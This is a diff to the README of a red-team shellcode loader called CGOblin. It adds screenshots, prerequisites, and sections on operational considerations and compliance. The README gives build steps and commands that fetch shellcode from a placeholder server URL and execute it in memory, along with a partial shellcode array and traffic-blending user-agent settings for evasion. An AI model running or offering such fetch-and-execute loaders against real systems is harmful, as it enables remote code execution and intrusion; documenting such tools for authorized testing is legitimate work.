@@ -6,6 +6,9 @@
 
 > 🔒 *For educational and red teaming purposes only.*
 
+<img width="689" height="887" alt="image" src="https://github.com/user-attachments/assets/541df9f7-914b-4a89-b5e3-695c3d004a7c" />
+
+
 ---
 
 ## 📦 Repository
@@ -28,10 +31,27 @@
 - ✅ Custom User-Agent and secure HTTP client settings
 
 ---
+<img width="1515" height="541" alt="image" src="https://github.com/user-attachments/assets/f2852e22-0121-4c3c-96c6-58774579c703" />
+
+## Prerequisites
+**CGOblin** requires a multi-language development environment supporting both Go and Python, with CGO compilation capabilities for system-level memory operations.
+
+### Core Requirements
+Component	Version	Purpose
+- Go	1.24.2+	Core application runtime and compilation
+- Python	3.x	Launcher script and development utilities [OPTIONAL]
+- CGO	Enabled	System call interface for memory operations
+- GCC/Clang	Latest	C compiler for CGO compilation
 
 ## 🛠️ Usage
 
+<img width="691" height="869" alt="image" src="https://github.com/user-attachments/assets/8cb716c2-8193-4ab3-99b0-dc4de0b5479c" />
+
+
 ### Build
+
+<img width="857" height="442" alt="image" src="https://github.com/user-attachments/assets/c9297511-7fe5-4708-aef7-adbb0eefa739" />
+
 
 ```bash
 # Linux
@@ -43,6 +63,8 @@ GOOS=linux go build -o loader_linux main.go loader_linux.go
 GOOS=windows go build -o loader_windows.exe main.go loader_windows.go
 ```
 
+<img width="654" height="851" alt="image" src="https://github.com/user-attachments/assets/88f85131-f90f-4197-a64a-9b8ad619043f" />
+
 💡 Ensure CGO is enabled: CGO_ENABLED=1 (default when supported). 
 
 ```bash
@@ -51,11 +73,16 @@ GOOS=windows go build -o loader_windows.exe main.go loader_windows.go
 ./loader_linux -url http://your-server.com/shellcode.txt
 ```
 
+<img width="1632" height="780" alt="image" src="https://github.com/user-attachments/assets/20f636d1-1eaf-4cf1-bbbb-0be9cb821e6c" />
+
+
 ```bash
 # Windows
 # Example
 powershell .\loader_windows.exe -url http://your-server.com/shellcode.txt
 ```
+
+<img width="1058" height="630" alt="image" src="https://github.com/user-attachments/assets/a5f04378-bdd6-417e-941c-fd6217afd123" />
 
 ```bash
 # shellcode
@@ -64,6 +91,10 @@ unsigned char buf[] = "\x6a\x29\x58\x99\x...";
 ```
 
 ⚠️ The loader parses only sequences matching \x.. and ignores everything else. 
+
+<img width="331" height="873" alt="image" src="https://github.com/user-attachments/assets/9c92957f-c060-47f5-865f-a01c8e5a767b" /> <img width="358" height="815" alt="image" src="https://github.com/user-attachments/assets/af8fc684-ccc7-47b8-a0d5-ebec36decb79" />
+
+
 
 ```text
 # Tree
@@ -90,6 +121,16 @@ unsigned char buf[] = "\x6a\x29\x58\x99\x...";
 # Example
 python3 -m http.server 8000
 ```
+
+## Security and Operational Considerations
+### cgoblin implements several security-conscious design patterns:
+
+- Memory-only operations: No temporary files are created during shellcode processing
+- Custom HTTP headers: Configurable User-Agent strings to blend with legitimate traffic
+- Input validation: Shellcode size limits and format verification
+- Platform isolation: Platform-specific code paths prevent cross-contamination
+- CGO safety: Proper memory management in C interface layers
+
 ## 🛑 Disclaimer
 This tool is intended for:
 
@@ -97,6 +138,15 @@ This tool is intended for:
 - Red team operations
 - Authorized penetration testing
 - Do not use for unauthorized access or malicious purposes. The author and team assume no liability for misuse.
+
+## Compliance Framework
+Users of cgoblin must ensure compliance with:
+
+- Local Computer Crime Laws: Unauthorized access laws vary by jurisdiction
+- Professional Ethics: Penetration testing codes of conduct
+- Contractual Obligations: Scope limitations in security assessments
+- Data Protection Regulations: Privacy laws when handling target systems
+
 
 ## 🤝 Team: LazyOwn RedTeam
 A dedicated red team focused on offensive security, exploit development, and defensive evasion techniques.
